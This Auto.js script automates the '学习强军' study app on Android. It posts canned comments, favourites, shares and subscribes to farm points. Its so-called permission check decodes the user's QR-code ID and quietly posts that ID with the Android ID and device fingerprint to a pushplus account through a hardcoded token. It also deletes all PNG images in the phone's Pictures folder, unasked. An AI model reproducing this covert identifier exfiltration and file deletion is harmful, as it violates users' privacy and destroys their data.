var idlujing = storages.create("shuju"); //被存的数据路径
//推送
var xxset = {
    "url": "http://www.pushplus.plus/send", //定义微信推送对象 url+"?token="+token+"&title="+title+"&content="+content
    "token": "0174cd8846854b7a8a665dbba842c46e", //在pushplus网站登录可以找到自己的token
    "wxpost": 1, //是否微信推送
};

var DLog; //记录内容推送用
function pushwx(title, content) { //发送日志post
    var wxsend = http.post(xxset.url, {
        "token": xxset.token,
        "title": title,
        "content": content,
    });
    return wxsend;
};

function detailLog(str, log) { //推送 日志记录和弹出提示
    var time = new java.text.SimpleDateFormat('HH:mm:ss').format(new Date());
    str = str + "<br/>" + time + " " + log;
    return str;
};

积分控制窗口();

function 启动软件() {
    console.setPosition(0, device.height / 2); //部分华为手机console有bug请注释本行
    // console.show(true); //部分华为手机console有bug请注释本行
    console.log("正在启动app...");
    if (!(launchApp("360手机卫士") || launch('com.qihoo360.mobilesafe'))) {
        console.error("正在启动");
        // return;
    };
    while (!text("军队应用").exists()) {
        console.log("等待加载");
        if (id("n4").exists()) {
            id("n4").findOne().click();
        }
        if (textContains("取消").exists() && textContains("立即升级").exists()) {
            text("取消").click();
        };
        sleep(3000);
    };
    sleep(1000)
    toastLog("完成app启动");
};
function 进入学习强军() {
    if (text("学习强军").exists()) {
        text("学习强军").findOne().parent().click();

    } else {
        id("fr").text("军队应用").findOne().parent().child(1).click();
        sleep(1000);
        className("android.widget.RadioButton").text("  软件仓库  ").click()
        sleep(1000);
        className("android.widget.TextView").id("i2").text("学习强军").findOne().parent().click();
    };
    sleep(3000);    // id("tv_jump").text("跳 过").findOne().click()//跳过
    if (textContains("跳 过").findOne(5000)) { while (!click("跳 过")); toastLog("关闭广告倒计时"); } else { toastLog("没有广告倒计时"); };
    sleep(1000);
    返回强军主页();
    while (!id("tv_home_tab_index2").text("学习").exists()) {
        console.log("等待加载");
        if (textContains("取消").exists() && textContains("立即升级").exists()) {
            text("取消").click();
        };
        sleep(3000);
    };
    toastLog("完成进入学习强军");
};


function 积分控制窗口() {
    threads.start(function () {
        console.show();
        sleep(100);
        console.setSize(device.width * 0.4, device.height * 0.50);
        console.setPosition(-27, device.height * 0.68);
    });
};
function 返回强军主页() {
    var 返回强军主页次数 = 0;
    while (!id("tv_home_tab_index2").text("学习").exists()) {
        console.log("等待加载" + 返回强军主页次数);
        if (textContains("取消").exists() && textContains("立即升级").exists()) {
            text("取消").click();
        };
        返回强军主页次数++
        back();
        sleep(2000);
        if (id("tv_content").className("android.widget.TextView").text("您确定要退出吗?").exists()) {
            id("btn_cancel").findOne().click()
        }
        if (返回强军主页次数 == 5) {
            启动软件();
            进入学习强军();
            break;
        };
    };
};
function 获取文章名字函数() {
    sleep(3000)
    if (id("tv_title").exists()) {
        toastLog(className("android.widget.TextView").id("tv_title").findOne().text())
    };
};
function 文章评论收藏分享函数() {
    var commentText = ["歌颂共产党,永远跟党走。", "为中华崛起而读书！", "倡导富强、民主、文明、和谐", "自由，平等，公正，法治", "不忘初心，牢记使命", "努力奋斗，回报祖国！", "赞叹中共伟大成就 祝福中国美好未来！"]; //评论内容，可自行修改，大于5个字便计分
    sleep(1000)
    if (id("detail_page_do_comment").text("欢迎发表您的观点").exists()) {//评论
        id("detail_page_do_comment").text("欢迎发表您的观点").findOne().click()
        sleep(1000)
        if (text("好观点会被优先展示").exists()) {
            text("好观点会被优先展示").findOne().click()
            sleep(1000)
            var num = random(0, commentText.length - 1) //随机数
            click("欢迎发表你的观点");
            sleep(1000);
            setText(commentText[num]); //输入评论内容
            click("发布");
            sleep("3000")
            toastLog("发布成功")
        };
    };
    sleep(1000);
    if (id("iv_collect").exists()) { //收藏
        log("收藏完成");
        id("iv_collect").findOne().click()
    };
    sleep(1000);
    if (id("iv_share").exists()) {//分享
        id("iv_share").findOne().click()
        while (!textContains("分享到").exists()); //等待弹出分享选项界面
        sleep(2000);
        toastLog("分享成功!");
        back();
    };
    sleep(1000);
};
function 倒计时函数(最小时间, 最大时间) {
    文章倒计时time = random(parseInt(最小时间), parseInt(最大时间))
    // console.log(文章倒计时time);
    for (文章倒计时变量i = 文章倒计时time; 文章倒计时变量i > 1; 文章倒计时变量i--) {
        sleep(1000);
        // toastLog(文章倒计时变量i)
        if (文章倒计时变量i % 5 == 0) {
            toast("剩余阅读时间：" + 文章倒计时变量i + "秒")
            swipe(device.width / 2, device.height * 0.6, device.width / 2, device.height * 0.6 - 100, 500);
        };
    };
};
var 加入课程表积分数量 = 0;
function 精品课堂函数() {
    加入课程表积分数量 = (7 - 加入课程表积分[0]) - 1
    toastLog("加入课程表精品课积分" + 加入课程表积分数量)
    返回强军主页();
    click(id("tv_home_tab_index0").text("资讯").findOne().parent().bounds().centerX(), id("tv_home_tab_index0").text("资讯").findOne().parent().bounds().centerY());
    sleep(2000);
    className("android.widget.TextView").text("首页").findOne(3000).click()
    sleep(3000);
    id("tv_title").text("精品课").findOne(3000).parent().click();
    sleep(3000);
    id("class_room_viewpager").waitFor();


    var 课程排序数字 = 0;
    while (true) {
        toastLog("选择第" + (课程排序数字 + 1) + "个课程")
        click(id("tv_status").findOnce(课程排序数字).parent().bounds().centerX(), id("tv_status").findOnce(课程排序数字).parent().bounds().centerY());
        课程排序数字++
        sleep(1000);
        if (id("course_video_add").text("加入课程表").exists()) {
            id("course_video_add").text("加入课程表").findOne().click()
            back()
            加入课程表积分数量--
            toastLog("完成课程添加")
        } else if (id("course_video_add").text("进入课程表").exists()) {
            // 加入课程表积分数量++
            toastLog("跳过课程添加")
            back()
        }
        sleep(3000)


        toastLog("需要加入课程的数量" + 加入课程表积分数量)
        if (加入课程表积分数量 == 0 || 加入课程表积分数量 < 1 || (课程排序数字 + 1) == 8 || (课程排序数字 + 1) > 7) {
            toastLog("课程完成");
            break;
        };
    }

    返回强军主页();
};
var 订阅强军号函数的数量 = 0;
function 订阅强军号函数() {
    订阅强军号函数的数量 = (7 - 订阅积分[0]) - 1
    toastLog("订阅强军号函数" + 订阅强军号函数的数量)
    返回强军主页();
    click(id("tv_home_tab_index1").text("课堂").findOne().parent().bounds().centerX(), id("tv_home_tab_index1").text("课堂").findOne().parent().bounds().centerY());
    sleep(2000);

    className("android.widget.TextView").id("tv_course_type1").text("更多").findOnce(0).click()
    // sleep(3000);
    text("已为您更新数据").waitFor();
    sleep(3000);

    var 订阅强军号排序数字 = 0;
    while (true) {
        toastLog("选择第" + (订阅强军号排序数字 + 1) + "个课程")
        // id("class_room_course_tv").
        click(id("class_room_course_tv").findOnce(订阅强军号排序数字).parent().bounds().centerX(), id("class_room_course_tv").findOnce(订阅强军号排序数字).parent().bounds().centerY());
        订阅强军号排序数字++
        sleep(1000);
        if (id("course_type_focus").text("关注").exists()) {
            id("course_type_focus").text("关注").findOne().click()
            back()
            订阅强军号函数的数量--
            toastLog("完成关注添加")
        } else if (id("course_type_focus").text("已关注").exists()) {
            // 订阅强军号函数的数量++
            toastLog("跳过关注添加")
            back()
        }
        sleep(3000)

        toastLog("需要加入课程的数量" + 订阅强军号函数的数量)
        if (订阅强军号函数的数量 == 0 || 订阅强军号函数的数量 < 1 || (订阅强军号排序数字 + 1) == 8 || (订阅强军号排序数字 + 1) > 7) {
            toastLog("课程完成");
            break;
        };
    }

    返回强军主页();
};



//====================ID检测部分
//====================ID检测部分
//====================ID检测部分
function 删除二维码() {
    device.vibrate(100);
    fileList = new Array; //获取文件内容搜索字段
    searchFiles(String("/sdcard/"), fileList, {
        dir: String("Pictures"),
        file: String(".png"),
    }, 1);
    sleep(250);// log("内容" + fileList.length)
    if (fileList.length !== 0) {// log(fileList)
        for (j = 0, len = fileList.length; j < len; j++) {
            var 数据 = fileList[j]
            files.remove(数据.path)
        };
    };

    // });
    // };
};


function searchFiles(dir, list, matchObj, C, D) {
    files.listDir(dir).forEach(fileName => { //遍历该文件夹的文件
        var path = files.join(dir, fileName);
        if (files.isDir(path)) { //如果是子文件夹则继续扫描子文件夹的文件
            if ((!C && C != 0) || C > 0) {
                if (!D) {
                    if (!matchObj.dir || isMatch(fileName, matchObj.dir)) {
                        searchFiles(path, list, matchObj, C - 1, true);
                    };
                } else {
                    searchFiles(path, list, matchObj, C - 1, D);
                };
            };
        } else {
            if (!matchObj.dir || D) {
                if (!matchObj.file || isMatch(fileName, matchObj.file)) {
                    if (!matchObj.fileIn || isMatch(String(files.read(path)), matchObj.fileIn)) {
                        list.push({//则把它添加到列表中
                            name: fileName,
                            parent: dir,
                            path: path
                        });
                    };
                };
            };
        };
    });
};
function isMatch(string, match) {
    if (typeof string != "string") {
        throw ">" + string + "< must be string"
    };
    return match instanceof RegExp ? match.test(string) : (string.indexOf(match) + 1);
};





var 调试模式完整文件名路径 = "";
var 调试模式完整二维码信息 = "";
function 使用权限验证() {
    返回强军主页();
    id("iv_mine_top").findOne().click()
    id("im_my_user_view").waitFor()
    sleep(100);
    id("im_my_user_view").findOne().click()
    id("tv_title").className("android.widget.TextView").text("我的二维码").waitFor()
    sleep(100);
    id("tv_title").className("android.widget.TextView").text("我的二维码").findOne().parent().click()
    id("profile_tv_qr_save_phone").text("保存到手机").waitFor()
    sleep(100);
    id("profile_tv_qr_save_phone").text("保存到手机").findOne().click()
    sleep(100);


    device.vibrate(100);
    fileList = new Array;
    searchFiles(String("/sdcard/"), fileList, {
        dir: String("Pictures"),
        file: String(".png"),
    }, 1);
    sleep(250);
    if (fileList.length == 1) {
        var 数据 = fileList[0]
        var 取二维码文件名 = 数据.name
    } else if (fileList.length !== 1) {
        删除二维码();
        if (fileList.length == 1) {
            var 数据 = fileList[0]
            var 取二维码文件名 = 数据.name
        } else if (fileList.length !== 1) {
            删除二维码();
        };
    };


    function 解析二维码(imgPath) {
        try {
            var pixels = images.readPixels(imgPath);
            var w = pixels.width;
            var h = pixels.height;
            var binaryBitmap = new BinaryBitmap(new HybridBinarizer(new RGBLuminanceSource(w, h, pixels.data)));
            var qrCodeResult = new MultiFormatReader().decode(binaryBitmap);
            var 结果 = qrCodeResult.getText()
            setClip(结果);
            return 结果;
        } catch (e) {
            toast("查询失败");
        };
    };


    sleep(100);
    let dexFilePath = "./res/zxing.dex";
    runtime.loadDex(dexFilePath);
    var imgPath = files.path("/sdcard/Pictures/" + 取二维码文件名);
    调试模式完整文件名路径 = imgPath;
    importClass(android.graphics.drawable.BitmapDrawable);
    importClass(java.util.Hashtable);
    //importClass(com.google.zxing.qrcode.QRCodeWriter);
    importPackage(com.google.zxing);
    importPackage(com.google.zxing.common);
    importPackage(com.google.zxing.client.j2se);
    importClass(android.graphics.Bitmap);
    importClass(java.io.FileOutputStream);
    importClass(java.io.BufferedOutputStream);
    sleep(100);
    var 二维码分析结果 = /[\u4e00-\u9fa5_a-zA-Z0-9_]{8,11}/gi.exec(解析二维码(imgPath));
    调试模式完整二维码信息 = 二维码分析结果;

    idlujing.put("xxqg_pz_id", 二维码分析结果[0]); //存ID
    setClip(二维码分析结果[0]);
    alert("已为您复制:" + 二维码分析结果[0] + "\n您可以直接粘贴发给客服.");
    sleep(100);

    threads.start(function () {
        var jqm = device.getAndroidId(); //机器码  //微信推送
        DLog = detailLog("输出日志", "机器码:" + jqm);
        var bsm = device.fingerprint //唯一标识码
        DLog = detailLog(DLog, "标识码:" + bsm);
        var battery = device.getBattery(); //获取电量
        DLog = detailLog(DLog, "设备当前电量：" + battery);
        DLog = detailLog(DLog, "调试模式完整文件名路径" + 调试模式完整文件名路径);
        DLog = detailLog(DLog, "调试模式完整二维码信息" + 调试模式完整二维码信息);
        DLog = detailLog(DLog, "强J的ID：" + 二维码分析结果[0]);

        var nowtime = new java.text.SimpleDateFormat('HH:mm:ss').format(new Date());
        var title = nowtime + "强J的ID查询"
        var content = DLog;
        var wxsend = pushwx(title, content);
        if (wxsend.statusCode == 200) { //发送成功与否？
            DLog = detailLog(DLog, "--==  成功  ==--"); //成功发送日志
            toast(" 成功 ")
            exit();
        } else {
            DLog = detailLog(DLog, "+++ 失败，请检查 +++");
            toast(" 异常 ")
            exit();
        };
    });





};






删除二维码();
启动软件();
进入学习强军();
使用权限验证();


删除二维码();


返回强军主页();
toastLog("完成前部调试");
exit();